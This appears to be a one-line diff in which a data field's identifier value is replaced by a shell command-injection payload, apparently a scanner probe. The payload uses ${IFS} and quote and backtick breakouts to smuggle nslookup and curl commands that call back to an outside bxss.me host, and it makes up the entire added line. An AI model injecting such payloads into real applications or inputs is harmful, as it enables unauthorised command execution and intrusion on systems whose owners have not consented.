@@ -1,1 +1,1 @@
-MO_212700056563_005
+&(nslookup${IFS}-q${IFS}cname${IFS}hittxlrldwgun0bb80.bxss.me||curl${IFS}hittxlrldwgun0bb80.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hittxlrldwgun0bb80.bxss.me||curl${IFS}hittxlrldwgun0bb80.bxss.me)&`'
